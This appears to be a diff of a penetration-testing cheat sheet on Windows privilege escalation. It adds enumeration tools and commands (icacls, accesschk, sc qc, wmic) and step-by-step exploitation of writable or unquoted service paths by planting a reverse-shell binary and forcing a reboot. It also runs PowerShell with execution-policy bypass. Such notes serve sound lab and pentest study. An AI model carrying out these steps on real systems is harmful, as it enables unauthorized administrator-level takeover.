@@ -616,9 +616,10 @@ Ensure architecture of your PS shell = architecture of PS payload.
 
 ### Automated Scripts
 
-```
-cmd> jaw
-```
+Scripts
+* Winpeas x86 x64
+* Jaws enum (Powershell)
+
 
 ### OS Vulnerabilities
 
@@ -632,14 +633,17 @@ Enum missing software patches - Sherlock.ps1
 1. Copy local `sherlock.ps1` file to remote.
 2. Run `cmd> powershell -executionpolicy bypass ".\sherlock.ps1"`.
 
+
 ### Services - Misconfigured Permissions
 
 Enumerate misconfigured service permissions
 * Exploit by replacing binary with malicious reverse shell binary.
 ```
+# enum running services
 cmd> tasklist /svc
 vulnservice.exe VulnService
 
+# enum service
 cmd> sc qc vulnservice
 [SC] QueryServiceConfig SUCCESS
 SERVICE_NAME: MEmuSVC
@@ -653,8 +657,11 @@ SERVICE_NAME: MEmuSVC
         DEPENDENCIES       : 
         SERVICE_START_NAME : LocalSystem
 
-cmd> icacls "C:\Program Files\path\to\vulnservice.exe"
-^LOOK OUT FOR FULL (F) AND WRITE (W)
+# check service permissions
+cmd> icacls/cacls "C:\Program Files\path\to\vulnservice.exe"
+^LOOK FOR FULL (F) WRITE (W)
+cmd> accesschk.exe -ucqv vulnservice -accepteula
+^LOOK FOR WRITE (W)
 
 Everyone:(I)(F)
 BUILTIN\Administrators:(I)(F)
@@ -677,7 +684,12 @@ cmd> wmic service get name,pathname,displayname,startmode | findstr /i auto | fi
 
 Exploit steps:
 1. Find unquoted service binpaths, for services run as ADMIN e.g. `binpath= C:\Program Files\A bad folder\adminservice.exe`.
-2. Check if you have FULL/WRITE `(F)(W)` permissions along path `icacls "C:\Program Files\folder\A bad folder\adminservice.exe"`.
+2. Check if you have FULL/WRITE `(F)(W)` permissions along path using:
+
+    a) `icacls "C:\Program Files\folder\A unquoted folder\adminservice.exe"` 
+
+    b) `accesschk.exe -ucqv [/path/to/unquoted/folder] -accepteula`
+
 3. Generate reverse shell payload and rename to path e.g. `A.exe`.
 4. Place malicious binary in path, so that it is executed e.g. `move A.exe "C:\Program Files\folder"`.
 5. Execute by restarting computer (if service has startmode = auto) with `shutdown /r /t 0`.
